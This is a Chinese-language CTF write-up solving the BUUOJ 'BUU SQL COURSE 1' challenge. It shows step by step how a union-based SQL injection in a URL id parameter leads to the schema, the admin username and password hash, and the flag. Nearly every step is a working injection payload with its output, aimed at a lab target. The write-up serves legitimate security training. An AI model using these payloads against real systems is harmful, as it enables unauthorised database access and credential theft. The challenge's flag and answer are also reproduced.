## [BUU SQL COURSE 1](https://buuoj.cn/challenges#BUU%20SQL%20COURSE%201)



## 0x00判断注入点



**此网站登录界面没有注入点，注入点被隐藏在请求网址中**



```url
http://xxx.cn:81/backend/content_detail.php?id=1
```



## 0x01使用order by 子句判断列数



```sql
http://xxx.cn:81/backend/content_detail.php?id=1 order by 1

http://xxx.cn:81/backend/content_detail.php?id=1 order by 2

结果为：

{"title":"\u6d4b\u8bd5\u65b0\u95fb1","content":"\u54c8\u54c8\u54c8\u54c8"}

```



到3时页面返回不正常，所以只有2列



## 0x02使用union select判断回显位置



```sql
http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1，2
```



结果为



```sql
{"title":"1","content":"2"}
```





## 0x03使用联合查询进行爆库等一系列操作



```sql
http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1，database()	#数据库名

http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1，version()		#数据库版本号

http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1，user()		#用户

http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1，@@version_compile_os	#平台
```



结果为

database		news

version		10.3.18-MariaDB

user		root@localhost

平台		Linux



## 0x04查询news数据库下的表



```sql
http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='news')
```



结果为



```sql
{"title":"1","content":"admin,contents"}
```



## 0x05查询admin和contents表



```sql
http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='admin')

http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='contents')
```



结果为



```sql
admin表：

{"title":"1","content":"id,username,password"}

contents表：

{"title":"1","content":"id,title,content"}
```



## 0x06查询admin表中的username和password的内容



```sql
http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1,username from admin

http://xxx.cn:81/backend/content_detail.php?id=-1 union select 1,password from admin
```



结果分别为



```sql
{"title":"1","content":"admin"}

{"title":"1","content":"b0a54ab070ad83caabc4187c7f35d4f6"}
```



## 0x06用查询到的用户名和密码去首页登录



**获得flag**



flag{9ce8ea3c-e9b8-4627-b849-f445602c4b7b}



作者

SihUi